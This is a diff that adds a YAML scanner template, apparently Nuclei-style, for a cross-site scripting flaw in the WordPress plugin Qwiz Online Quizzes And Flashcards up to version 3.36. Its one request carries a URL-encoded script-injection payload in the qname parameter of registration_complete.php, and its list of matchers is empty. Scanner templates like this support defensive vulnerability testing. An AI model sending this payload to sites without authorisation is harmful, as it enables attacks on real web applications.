@@ -1,0 +1,20 @@
+id: wp-qwiz-online-xss
+brief:
+    title: Qwiz Online Quizzes And Flashcards <= 3.36 - Cross-Site Scripting
+    by: r3Y3r53
+    level: medium
+    about: The qname, i_qwiz, session_id and username parameters passed to the registration_complete.php file are affected by XSS issues.
+    label:
+        - wordpress
+        - wp-plugin
+        - wp
+        - wpscan
+        - packetstorm
+        - qwiz-online-quizzes-and-flashcards
+        - xss
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/wp-content/plugins/qwiz-online-quizzes-and-flashcards/registration_complete.php?&qname=%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E'
+      signs: []
